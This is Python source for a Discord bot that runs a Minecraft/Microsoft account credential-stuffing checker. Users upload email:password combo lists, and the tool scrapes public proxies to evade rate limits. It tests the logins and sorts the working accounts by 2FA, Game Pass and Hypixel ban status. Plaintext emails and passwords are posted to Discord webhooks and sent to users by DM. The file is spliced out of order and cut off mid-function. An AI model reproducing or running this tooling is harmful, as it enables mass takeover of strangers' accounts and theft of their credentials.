    config.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
    config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
    config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))
    config.set('payment', str_to_bool(read_config['Captures']['Payment']))

def get_proxies():
    global proxylist
    http = []
    socks4 = []
    socks5 = []
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt"
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
    ]
    for service in api_http:
        try:
            http.extend(requests.get(service, timeout=30).text.splitlines())
        except: pass
    for service in api_socks4: 
        try:
            socks4.extend(requests.get(service, timeout=30).text.splitlines())
        except: pass
    for service in api_socks5: 
        try:
            socks5.extend(requests.get(service, timeout=30).text.splitlines())
        except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks4&limit=500", timeout=30).json().get('data', []):
            socks4.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500", timeout=30).json().get('data', []):
            socks5.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    http = list(set(http))
    socks4 = list(set(socks4))
    socks5 = list(set(socks5))
    proxylist.clear()
    for proxy in http: 
        if proxy.strip(): proxylist.append({'http': 'http://'+proxy.strip(), 'https': 'http://'+proxy.strip()})
    for proxy in socks4: 
        if proxy.strip(): proxylist.append({'http': 'socks4://'+proxy.strip(),'https': 'socks4://'+proxy.strip()})
    for proxy in socks5: 
        if proxy.strip(): proxylist.append({'http': 'socks5://'+proxy.strip(),'https': 'socks5://'+proxy.strip()})
    if screen == "'2'": print(Fore.LIGHTBLUE_EX+f'Scraped [{len(proxylist)}] proxies')
    autoscrape_time = config.get('autoscrape')
    if autoscrape_time and autoscrape_time > 0:
        time.sleep(autoscrape_time * 60)
        get_proxies()

def banproxyload(file_path):
    global banproxies
    try:
        with open(file_path, 'r+', encoding='utf-8', errors='ignore') as e:
            ext = e.readlines()
            for line in ext:
                try:
                    proxyline = line.split()[0].replace('\n', '')
                    banproxies.append(proxyline)
                except: pass
        return True, f"Loaded [{len(banproxies)}] ban proxies."
    except Exception:
        return False, "Your file is probably harmed."

# Discord Bot Implementation
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='/', intents=intents)
synced_commands = False

active_checkers = {}

class CheckerSession:
    def __init__(self, ctx, threads, proxy_type, combos_file, proxies_file=None, webhook_url=None):
        self.ctx = ctx
        self.threads = threads
        self.proxy_type = proxy_type
        self.combos_file = combos_file
        self.proxies_file = proxies_file
        self.webhook_url = webhook_url
        self.session_id = str(ctx.id)
        self.is_running = True
        self.stats = {
            'checked': 0,
            'total': 0,
            'hits': 0,
            'bad': 0,
            'twofa': 0,
            'sfa': 0,
            'mfa': 0,
            'xgp': 0,
            'xgpu': 0,
            'other': 0,
            'vm': 0,
            'errors': 0,
            'retries': 0,
            'unbanned': 0,
            'banned_count': 0,
            'start_time': datetime.now()
        }
        
    async def send_status_update(self):
        if not self.is_running:
            return
            
        elapsed = datetime.now() - self.stats['start_time']
        hours, remainder = divmod(elapsed.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        progress_percent = (self.stats['checked'] / self.stats['total']) * 100 if self.stats['total'] > 0 else 0
        
        embed = discord.Embed(
            title="🔍 Checker Status",
            color=discord.Color.blue(),
            timestamp=datetime.now()
        )
        
        embed.add_field(
            name="Progress",
            value=f"`{self.stats['checked']}/{self.stats['total']}` ({progress_percent:.1f}%)",
            inline=True
        )
        
        embed.add_field(
            name="Results",
            value=f"✅ Hits: `{self.stats['hits']}`\n❌ Bad: `{self.stats['bad']}`\n🔐 2FA: `{self.stats['twofa']}`",
            inline=True
        )
        
        embed.add_field(
            name="Account Types",
            value=f"🎮 SFA: `{self.stats['sfa']}`\n🔓 MFA: `{self.stats['mfa']}`\n📧 Valid Mail: `{self.stats['vm']}`",
            inline=True
        )
        
        embed.add_field(
            name="Xbox & Other",
            value=f"🎯 XGP: `{self.stats['xgp']}`\n⚡ XGPU: `{self.stats['xgpu']}`\n📦 Other: `{self.stats['other']}`",
            inline=True
        )
        
        embed.add_field(
            name="Ban Status",
            value=f"🟢 Unbanned: `{self.stats['unbanned']}`\n🔴 Banned: `{self.stats['banned_count']}`",
            inline=True
        )
        
        embed.add_field(
            name="Technical",
            value=f"🔄 Retries: `{self.stats['retries']}`\n❓ Errors: `{self.stats['errors']}`\n⏱️ {int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}",
            inline=True
        )
        
        embed.set_footer(text=f"Session ID: {self.session_id}")
        
        try:
            await self.ctx.send(embed=embed)
        except Exception as e:
            print(f"Failed to send status update: {e}")

    async def send_results_to_dm(self):
        """Send results files to user's DM"""
        try:
            user = self.ctx.author
            dm_channel = await user.create_dm()
            
            elapsed = datetime.now() - self.stats['start_time']
            hours, remainder = divmod(elapsed.total_seconds(), 3600)
            minutes, seconds = divmod(remainder, 60)
            
            embed = discord.Embed(
                title="📊 Checker Results",
                description=f"Session `{self.session_id[:8]}...` completed",
                color=discord.Color.green()
            )
            embed.add_field(name="Hits", value=str(self.stats['hits']), inline=True)
            embed.add_field(name="Bad", value=str(self.stats['bad']), inline=True)
            embed.add_field(name="2FA", value=str(self.stats['twofa']), inline=True)
            embed.add_field(name="Duration", value=f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}", inline=True)
            
            await dm_channel.send(embed=embed)
            
            files_to_send = []
            file_types = {
                "Hits.txt": "✅ Hits",
                "Capture.txt": "📋 Full Captures",
                "2fa.txt": "🔐 2FA Accounts",
                "SFA.txt": "🎮 SFA Accounts", 
                "MFA.txt": "🔓 MFA Accounts",
                "Banned.txt": "🔴 Banned Accounts",
                "Unbanned.txt": "🟢 Unbanned Accounts",
                "XboxGamePass.txt": "🎯 Xbox Game Pass",
                "XboxGamePassUltimate.txt": "⚡ Xbox Game Pass Ultimate",
                "Other.txt": "📦 Other",
                "Valid_Mail.txt": "📧 Valid Mail"
            }
            
            results_dir = f"results/{fname}"
            
            if os.path.exists(results_dir):
                for filename, description in file_types.items():
                    filepath = os.path.join(results_dir, filename)
                    if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
                        files_to_send.append((filepath, filename, description))
                
                if files_to_send:
                    await dm_channel.send("📁 **Result Files:**")
                    for filepath, filename, description in files_to_send:
                        try:
                            discord_file = discord.File(filepath, filename=filename)
                            await dm_channel.send(f"**{description}** - `{filename}`", file=discord_file)
                        except Exception as e:
                            print(f"Failed to send {filename}: {e}")
                else:
                    await dm_channel.send("⚠️ No result files were generated.")
            else:
                await dm_channel.send("⚠️ No results directory found.")
                
        except discord.Forbidden:
            try:
                await self.ctx.send("⚠️ I couldn't send you the results in DM. Please enable DMs from server members.")
            except:
                pass
        except Exception as e:
            print(f"Error sending results to DM: {e}")

    async def run_checker(self):
        try:
            loadconfig()
            
            success, message = Load(self.combos_file)
            if not success:
                await self.ctx.send(f"❌ {message}")
                return
            
            self.stats['total'] = len(Combos)
            
            global proxytype, screen
            proxytype = self.proxy_type
            screen = "'2'"
            
            if self.proxies_file and proxytype != "'4'" and proxytype != "'5'":
                success, message = Proxys(self.proxies_file)
                if not success:
                    await self.ctx.send(f"❌ {message}")
                    return
            
            if proxytype == "'5'":
                await self.ctx.send("🔄 Scraping proxies...")
                threading.Thread(target=get_proxies, daemon=True).start()
                max_wait = 30
                waited = 0
                while len(proxylist) == 0 and waited < max_wait:
                    await asyncio.sleep(1)
                    waited += 1
                if len(proxylist) == 0:
                    await self.ctx.send("❌ Failed to scrape proxies. Switching to proxyless mode.")
                    proxytype = "'4'"
            
            global fname
            fname = f"discord_check_{self.session_id}"
            if not os.path.exists(f"results/{fname}"):
                os.makedirs(f"results/{fname}")
            
            asyncio.create_task(self.status_loop())
            
            embed = discord.Embed(
                title="🚀 Checker Started",
                color=discord.Color.green(),
                description=f"Checking {self.stats['total']} accounts with {self.threads} threads"
            )
            embed.add_field(name="Proxy Type", value=self.get_proxy_type_name(), inline=True)
            embed.add_field(name="Session ID", value=self.session_id, inline=True)
            await self.ctx.send(embed=embed)
            
            loop = asyncio.get_running_loop()
            await loop.run_in_executor(None, self._run_checker_blocking)
            
            await self.send_final_summary("🏁 Checker Completed")
            await self.send_results_to_dm()
            
        except Exception as e:
            await self.ctx.send(f"❌ Checker error: {str(e)}")
            print(f"Checker error: {traceback.format_exc()}")
        finally:
            if self.session_id in active_checkers:
                del active_checkers[self.session_id]
            
            try:
                if os.path.exists(self.combos_file):
                    os.remove(self.combos_file)
                if self.proxies_file and os.path.exists(self.proxies_file):
                    os.remove(self.proxies_file)
            except:
                pass

    def _run_checker_blocking(self):
        global session_webhook_url
        session_webhook_url = self.webhook_url
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.safe_checker, combo) for combo in Combos]
            
            for future in concurrent.futures.as_completed(futures):
                if not self.is_running:
                    break
                try:
                    future.result()
                except Exception as e:
                    self.stats['errors'] += 1

    def safe_checker(self, combo):
        if not self.is_running:
            return
            
        try:
            global hits, bad, twofa, sfa, mfa, xgp, xgpu, other, vm, errors, retries, checked, unbanned, banned_count
            
            Checker(combo)
            
            self.stats['checked'] = checked
            self.stats['hits'] = hits
            self.stats['bad'] = bad
            self.stats['twofa'] = twofa
            self.stats['sfa'] = sfa
            self.stats['mfa'] = mfa
            self.stats['xgp'] = xgp
            self.stats['xgpu'] = xgpu
            self.stats['other'] = other
            self.stats['vm'] = vm
            self.stats['errors'] = errors
            self.stats['retries'] = retries
            self.stats['unbanned'] = unbanned
            self.stats['banned_count'] = banned_count
            
        except Exception as e:
            self.stats['errors'] += 1

    def get_proxy_type_name(self):
        proxy_names = {
            "'1'": "HTTP",
            "'2'": "SOCKS4", 
            "'3'": "SOCKS5",
            "'4'": "None",
            "'5'": "Auto Scraper"
        }
        return proxy_names.get(self.proxy_type, "Unknown")

    async def status_loop(self):
        while self.is_running and self.stats['checked'] < self.stats['total']:
            await self.send_status_update()
            await asyncio.sleep(10)

    async def send_final_summary(self, title="🏁 Checker Completed"):
        elapsed = datetime.now() - self.stats['start_time']
        hours, remainder = divmod(elapsed.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        embed = discord.Embed(
            title=title,
            color=discord.Color.green() if self.stats['checked'] >= self.stats['total'] else discord.Color.orange(),
            timestamp=datetime.now()
        )
        
        if self.stats['checked'] < self.stats['total']:
            embed.description = f"**Stopped by user** - {self.stats['checked']}/{self.stats['total']} accounts checked"
        else:
            embed.description = f"**Completed** - All {self.stats['total']} accounts checked"
        
        embed.add_field(
            name="Final Results",
            value=f"✅ **Hits**: `{self.stats['hits']}`\n"
                  f"❌ **Bad**: `{self.stats['bad']}`\n"
                  f"🔐 **2FA**: `{self.stats['twofa']}`\n"
                  f"🎮 **SFA**: `{self.stats['sfa']}`\n"
                  f"🔓 **MFA**: `{self.stats['mfa']}`",
            inline=True
        )
        
        embed.add_field(
            name="Account Types",
            value=f"🎯 **XGP**: `{self.stats['xgp']}`\n"
                  f"⚡ **XGPU**: `{self.stats['xgpu']}`\n"
                  f"📦 **Other**: `{self.stats['other']}`\n"
                  f"📧 **Valid Mail**: `{self.stats['vm']}`",
            inline=True
        )
        
        embed.add_field(
            name="Ban Status",
            value=f"🟢 **Unbanned**: `{self.stats['unbanned']}`\n"
                  f"🔴 **Banned**: `{self.stats['banned_count']}`",
            inline=True
        )
        
        embed.add_field(
            name="Statistics",
            value=f"⏱️ **Duration**: {int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}\n"
                  f"📊 **Total**: `{self.stats['total']}`\n"
                  f"🔍 **Checked**: `{self.stats['checked']}`\n"
                  f"❓ **Errors**: `{self.stats['errors']}`\n"
                  f"🔄 **Retries**: `{self.stats['retries']}`",
            inline=True
        )
        
        embed.set_footer(text=f"Session ID: {self.session_id}")
        
        await self.ctx.send(embed=embed)
        
        if self.webhook_url:
            await self.send_webhook_summary()

    async def send_webhook_summary(self):
        webhook_data = {
            "username": "VaultCore - Discord Bot",
            "embeds": [{
                "title": "Checker Summary",
                "color": 3066993,
                "fields": [
                    {"name": "Total Accounts", "value": str(self.stats['total']), "inline": True},
                    {"name": "Checked", "value": str(self.stats['checked']), "inline": True},
                    {"name": "Hits", "value": str(self.stats['hits']), "inline": True},
                    {"name": "Bad", "value": str(self.stats['bad']), "inline": True},
                    {"name": "2FA", "value": str(self.stats['twofa']), "inline": True},
                    {"name": "Session ID", "value": self.session_id, "inline": False}
                ],
                "timestamp": datetime.now(timezone.utc).isoformat()
            }]
        }
        
        try:
            requests.post(self.webhook_url, json=webhook_data)
        except Exception as e:
            print(f"Failed to send webhook: {e}")

@bot.event
async def on_ready():
    global synced_commands
    print(f'🤖 {bot.user} has logged in!')
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=".gg/vaultcore Stocks"
        )
    )
    
    if not synced_commands:
        try:
            synced = await bot.tree.sync()
            synced_commands = True
            print(f"✅ Synced {len(synced)} slash command(s)")
        except Exception as e:
            print(f"❌ Failed to sync slash commands: {e}")

@bot.tree.command(name="check", description="Start checking Minecraft accounts")
async def check(interaction: discord.Interaction, threads: int, proxy_type: str, webhook_url: str = None):
    await interaction.response.defer()
    
    if threads < 1 or threads > 50:
        await interaction.followup.send("❌ Threads must be between 1 and 50")
        return
    
    proxy_map = {
        '1': "'1'", 'http': "'1'",
        '2': "'2'", 'socks4': "'2'", 
        '3': "'3'", 'socks5': "'3'",
        '4': "'4'", 'none': "'4'",
        '5': "'5'", 'auto': "'5'"
    }
    
    if proxy_type.lower() not in proxy_map:
        await interaction.followup.send("❌ Invalid proxy type. Use: `1` (Http/s), `2` (Socks4), `3` (Socks5), `4` (None), `5` (Auto Scraper)")
        return
    
    mapped_proxy_type = proxy_map[proxy_type.lower()]
    
    user_sessions = [s for s in active_checkers.values() if s.ctx.author.id == interaction.user.id and s.is_running]
    if user_sessions:
        await interaction.followup.send("❌ You already have an active checker session. Use `/stop` to stop it first.")
        return
    
    embed = discord.Embed(
        title="🔧 Checker Setup",
        description="Please upload your files to start checking",
        color=discord.Color.blue()
    )
    embed.add_field(name="Threads", value=str(threads), inline=True)
    embed.add_field(name="Proxy Type", value=proxy_type, inline=True)
    embed.add_field(name="Webhook", value=webhook_url or "Not set", inline=True)
    
    await interaction.followup.send(embed=embed)
    await interaction.followup.send("📁 **Please upload your combos file now** (text file with email:password format):")
    
    def check_attachment(message):
        return (message.author == interaction.user and 
                message.channel == interaction.channel and 
                message.attachments and 
                message.attachments[0].filename.endswith('.txt'))
    
    try:
        attachment_msg = await bot.wait_for('message', check=check_attachment, timeout=60.0)
        combos_attachment = attachment_msg.attachments[0]
        
        combos_content = await combos_attachment.read()
        combos_path = f"temp_combos_{interaction.id}.txt"
        
        with open(combos_path, 'wb') as f:
            f.write(combos_content)
        
        with open(combos_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            if len(lines) == 0:
                await interaction.followup.send("❌ The provided combos file is empty.")
                os.remove(combos_path)
                return
        
        try:
            await attachment_msg.delete()
        except:
            pass
            
        await interaction.followup.send(f"✅ **Combos loaded**: {len(lines)} accounts")
        
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ File upload timed out. Please try the command again.")
        return
    except Exception as e:
        await interaction.followup.send(f"❌ Error reading combos file: {str(e)}")
        return
    
    proxies_path = None
    if mapped_proxy_type != "'4'" and mapped_proxy_type != "'5'":
        await interaction.followup.send("🌐 **Optional**: Upload your proxies file or type `skip` to continue without proxies:")
        
        def check_proxy_attachment_or_skip(message):
            return (message.author == interaction.user and 
                    message.channel == interaction.channel and 
                    ((message.attachments and message.attachments[0].filename.endswith('.txt')) or
                     message.content.lower().strip() in ['skip', 'no', 'none']))
        
        try:
            proxy_msg = await bot.wait_for('message', check=check_proxy_attachment_or_skip, timeout=30.0)
            
            if proxy_msg.attachments:
                proxies_attachment = proxy_msg.attachments[0]
                
                proxies_content = await proxies_attachment.read()
                proxies_path = f"temp_proxies_{interaction.id}.txt"
                
                with open(proxies_path, 'wb') as f:
                    f.write(proxies_content)
                
                with open(proxies_path, 'r', encoding='utf-8') as f:
                    proxy_lines = f.readlines()
                    if len(proxy_lines) == 0:
                        await interaction.followup.send("⚠️ The provided proxies file is empty. Continuing without proxies.")
                        proxies_path = None
                    else:
                        await interaction.followup.send(f"✅ **Proxies loaded**: {len(proxy_lines)} proxies")
                
                try:
                    await proxy_msg.delete()
                except:
                    pass
                    
            else:
                await interaction.followup.send("ℹ️ Continuing without proxies.")
                
        except asyncio.TimeoutError:
            await interaction.followup.send("ℹ️ Proxies upload timed out. Continuing without proxies.")
    
    class ContextLike:
        def __init__(self, interaction):
            self.author = interaction.user
            self.channel = interaction.channel
            self.send = interaction.followup.send
            self.id = interaction.id
    
    ctx_like = ContextLike(interaction)
    
    session = CheckerSession(ctx_like, threads, mapped_proxy_type, combos_path, proxies_path, webhook_url)
    active_checkers[session.session_id] = session
    
    asyncio.create_task(session.run_checker())

from discord import app_commands

@bot.tree.command(name="stop", description="Stop checking sessions")
@app_commands.describe(session_id="ID of the session you want to stop")
async def stop(interaction: discord.Interaction, session_id: str | None = None):
    try:
        await interaction.response.defer(thinking=True)

        stopped_sessions = []

        if session_id:
            session = active_checkers.get(session_id)

            if not session:
                return await interaction.followup.send("❌ Session not found or already completed.")

            if session.ctx.author.id != interaction.user.id:
                return await interaction.followup.send("❌ You can only stop **your own** sessions.")

            session.is_running = False
            stopped_sessions.append(session)

            await interaction.followup.send(f"🛑 Stopped checker session `{session_id}`")

        else:
            user_sessions = [
                s for s in active_checkers.values()
                if s.ctx.author.id == interaction.user.id and s.is_running
            ]

            if not user_sessions:
                return await interaction.followup.send("❌ You don't have any active checker sessions.")

            for session in user_sessions:
                session.is_running = False
                stopped_sessions.append(session)

            await interaction.followup.send(f"🛑 Stopped **{len(stopped_sessions)}** checker session(s).")

        for session in stopped_sessions:
            try:
                await session.send_final_summary("🛑 Checker Stopped")
                await session.send_results_to_dm()
            except Exception as e:
                print("Error sending summary:", e)

    except Exception as e:
        try:
            await interaction.followup.send(f"❌ Error occurred: `{e}`")
        except:
            pass



@bot.tree.command(name="status", description="Check session status")
async def status(interaction: discord.Interaction, session_id: str = None):
    await interaction.response.defer()
    
    if session_id:
        if session_id in active_checkers:
            session = active_checkers[session_id]
            if session.ctx.author.id != interaction.user.id:
                await interaction.followup.send("❌ You can only check your own sessions.")
                return
            
            class ContextLike:
                def __init__(self, interaction):
                    self.author = interaction.user
                    self.channel = interaction.channel
                    self.send = interaction.followup.send
                    self.id = interaction.id
            
            ctx_like = ContextLike(interaction)
            session.ctx = ctx_like
            await session.send_status_update()
        else:
            await interaction.followup.send("❌ Session not found or completed.")
    else:
        user_sessions = [s for s in active_checkers.values() 
                        if s.ctx.author.id == interaction.user.id and s.is_running]
        
        if not user_sessions:
            await interaction.followup.send("❌ You don't have any active checker sessions.")
            return
        
        embed = discord.Embed(
            title="📊 Your Active Sessions",
            color=discord.Color.blue()
        )
        
        for session in user_sessions:
            progress = f"{session.stats['checked']}/{session.stats['total']} ({session.stats['checked']/session.stats['total']*100:.1f}%)"
            embed.add_field(
                name=f"Session {session.session_id[:8]}...",
                value=f"Progress: {progress}\nHits: {session.stats['hits']}",
                inline=True
            )
        
        await interaction.followup.send(embed=embed)

@bot.tree.command(name="list", description="List all active sessions")
async def list_sessions(interaction: discord.Interaction):
    await interaction.response.defer()
    
    active_sessions = [s for s in active_checkers.values() if s.is_running]
    
    if not active_sessions:
        await interaction.followup.send("❌ No active checker sessions.")
        return
    
    embed = discord.Embed(
        title="📋 All Active Sessions",
        color=discord.Color.purple()
    )
    
    for session in active_sessions:
        user = session.ctx.author
        progress = f"{session.stats['checked']}/{session.stats['total']} ({session.stats['checked']/session.stats['total']*100:.1f}%)"
        embed.add_field(
            name=f"{user.name} - {session.session_id[:8]}...",
            value=f"Progress: {progress}\nHits: {session.stats['hits']}\nThreads: {session.threads}",
            inline=True
        )
    
    await interaction.followup.send(embed=embed)

def setup_checker():
    try:
        loadconfig()
        print("✅ Checker configuration loaded")
    except Exception as e:
        print(f"❌ Error loading config: {e}")

@bot.event
async def on_connect():
    setup_checker()

def run_discord_bot(token):
    try:
        bot.run(token)
    except Exception as e:
        print(f"❌ Failed to start bot: {e}")

if __name__ == "__main__":
    import sys
    
    load_dotenv()
    token = os.getenv("BOT_TOKEN")
    
    if not token:
        print("❌ No BOT_TOKEN provided")
        print("💡 Set the BOT_TOKEN environment variable or secret")
        sys.exit(1)
    
    print("🚀 Starting Discord bot...")
    run_discord_bot(token)
import os
from dotenv import load_dotenv
import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
from io import StringIO
from http.cookiejar import MozillaCookieJar

# Linux-specific imports
try:
    from colorama import Fore
    colorama_available = True
except ImportError:
    colorama_available = False
    # Create basic color class for Linux
    class Fore:
        YELLOW = '\033[93m'
        GREEN = '\033[92m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        LIGHTMAGENTA_EX = '\033[95m'
        LIGHTBLUE_EX = '\033[94m'
        LIGHTGREEN_EX = '\033[92m'
        LIGHTRED_EX = '\033[91m'

# Linux console utils replacement
class LinuxUtils:
    @staticmethod
    def set_title(title):
        # For Linux terminals
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()

# Use Linux utils instead of console.utils
utils = LinuxUtils()

# Linux file dialog replacement
class LinuxFileDialog:
    @staticmethod
    def askopenfile(**kwargs):
        filepath = input("Enter the full path to your file: ")
        if os.path.exists(filepath):
            return type('FileObj', (), {'name': filepath})()
        return None

filedialog = LinuxFileDialog()

# Minecraft imports (you'll need to install these dependencies)
try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    from minecraft.exceptions import LoginDisconnect
    minecraft_available = True
except ImportError:
    minecraft_available = False
    print("Warning: Minecraft networking library not available. Ban checking will be disabled.")

logo = Fore.YELLOW+'''
\n'''
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
banproxies = []
fname = ""
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
unbanned, banned_count = 0, 0
session_webhook_url = None
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.session = session
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl != None: message+=f"\nHypixel: {self.hypixl}"
        if self.level != None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin != None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        return message+"\n============================\n"

    def notify(self):
        global errors, session_webhook_url
        try:
            webhook_url = config.get('webhook') or session_webhook_url
            
            if str(self.banned).lower() == "false" and config.get('UnbannedWebhook'):
                webhook_url = config.get('UnbannedWebhook')
            elif str(self.banned).lower() != "false" and str(self.banned).lower() != "unknown" and config.get('BannedWebhook'):
                webhook_url = config.get('BannedWebhook')

            if not webhook_url:
                return

            if config.get('embed') == True:
                embed_color = 0
                if str(self.banned).lower() == "false":
                    embed_color = 0
                elif str(self.banned).lower() != "false" and str(self.banned).lower() != "unknown":
                    embed_color = 0
                
                payload = {
                "username": "Vex Development",
                "avatar_url": f"https://mc-heads.net/avatar/{self.name}",
                "embeds": [
                    {
                    "author": {"name": "Vex Development", "url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png"},
                    "title": self.name,
                    "color": 37166,
                    "fields": [
                                {"name": "<a:mail:1415294347162681355> Email", "value": f"||{self.email}||", "inline": True},
                                {"name": "<a:password:1415294427752038511> Password", "value": f"||{self.password}||", "inline": True},
                                {"name": "<a:banned:1415293976445194243> Banned", "value": f"{self.banned or 'Unknown'}", "inline": True},
                                {"name": "<a:hypixel:1415293267804815391> Hypixel Name", "value": self.hypixl or "N/A", "inline": True},
                                {"name": "<a:name:1415295283948027924> Can Change Name", "value": self.namechanged or "N/A", "inline": True},
                                {"name": "<a:ms_coin:1415293380690186240> Hypixel Level", "value": self.level or "N/A", "inline": True},
                                {"name": "<a:cape:1415293674647982121> Capes", "value": f"{self.capes or 'None'} | Optifine: {self.cape or 'No'}", "inline": True},
                                {"name": "<a:mcfa:1415293802402414634> Account Type", "value": self.type or "N/A", "inline": True},
                                {"name": "<a:MicrosoftMojang:1415294909006745691> Combo", "value": f"||{self.email}:{self.password}||", "inline": True},
                                {"name": "<:emoji_1:1450698111172214805> First Login", "value": self.firstlogin or "N/A", "inline": True},
                                {"name": "<2:emoji_2:1450698140784132226> Last Login", "value": self.lastlogin or "N/A", "inline": True},
                                {"name": "<:emoji_3:1450698187277864960> Last Name Change", "value": self.lastchanged or "N/A", "inline": True},
                                {"name": "<a:emoji_4:1450698212112465971> Skyblock Coins", "value": self.sbcoins or "N/A", "inline": True},
                                {"name": "<a:emoji_7:1450698237060321301> Bedwars Stars", "value": self.bwstars or "N/A", "inline": True},
                                {"name": "<:emoji_6:1450698265011032127> Email Access", "value": self.access or "N/A", "inline": True},
                            ],
                            "thumbnail": {"url": f"https://mc-heads.net/avatar/{self.name}"},
                            "footer": {
                                "text": "Vex Development | made with ❤️ by Vortex",
                                "icon_url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png"

                            }
                        }
                    ]
                }
            else:
                payload = {
                    "content": config.get('message')
                        .replace("<email>", self.email)
                        .replace("<password>", self.password)
                        .replace("<name>", self.name or "N/A")
                        .replace("<hypixel>", self.hypixl or "N/A")
                        .replace("<level>", self.level or "N/A")
                        .replace("<firstlogin>", self.firstlogin or "N/A")
                        .replace("<lastlogin>", self.lastlogin or "N/A")
                        .replace("<ofcape>", self.cape or "N/A")
                        .replace("<capes>", self.capes or "N/A")
                        .replace("<access>", self.access or "N/A")
                        .replace("<skyblockcoins>", self.sbcoins or "N/A")
                        .replace("<bedwarsstars>", self.bwstars or "N/A")
                        .replace("<banned>", self.banned or "Unknown")
                        .replace("<namechange>", self.namechanged or "N/A")
                        .replace("<lastchanged>", self.lastchanged or "N/A")
                        .replace("<type>", self.type or "N/A"),
                    "username": "Vex Development"
                }

            requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"})
        except:
            pass

    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') is True or config.get('hypixellevel') is True or config.get('hypixelfirstlogin') is True or config.get('hypixellastlogin') is True or config.get('hypixelbwstars') is True:
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try: 
                    if config.get('hypixelname') is True: self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try: 
                    if config.get('hypixellevel') is True: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelfirstlogin') is True: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixellastlogin') is True: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
